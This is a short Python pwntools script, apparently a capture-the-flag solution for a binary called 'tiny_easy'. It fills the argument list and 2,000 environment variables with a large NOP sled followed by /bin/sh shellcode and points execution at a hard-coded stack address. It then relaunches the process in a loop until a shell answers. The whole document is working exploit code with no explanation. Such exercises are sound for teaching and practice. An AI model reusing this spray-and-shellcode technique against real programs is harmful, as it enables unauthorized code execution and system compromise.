from pwn import *

context.log_level = "debug"
context.arch = "i386"

shellcode = b"\x90" * 9000 + asm(shellcraft.sh())
argv = [b"\xaa\xdf\xff\xff"]
env = {}
for i in range(0, 2000):
    env[str(i)] = shellcode
    argv.append(shellcode)
while True:
    r = process(argv=argv, executable="./tiny_easy", env=env)
    try:
        r.sendline(b"ls")
        print(r.recv())
    except:
        print("lost")
        continue
